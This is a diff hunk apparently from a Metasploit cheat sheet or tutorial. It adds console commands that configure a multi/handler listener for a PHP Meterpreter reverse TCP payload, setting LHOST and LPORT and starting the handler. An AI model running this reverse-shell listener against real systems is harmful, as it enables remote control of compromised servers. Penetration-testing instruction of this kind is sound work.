@@ -22,6 +22,12 @@ msf > use multi/handler
 msf exploit(handler) > set PAYLOAD php/meterpreter/reverse_tcp
 PAYLOAD => php/meterpreter/reverse_tcp
 msf exploit(handler) > set LHOST [IP]
+LHOST => [IP]
+msf exploit(handler) > set LPORT 4444
+LPORT => 4444
+msf exploit(handler) > exploit
+
+[*] Started reverse TCP handler on [IP]
   ```
   
 ## Important Basic Commands
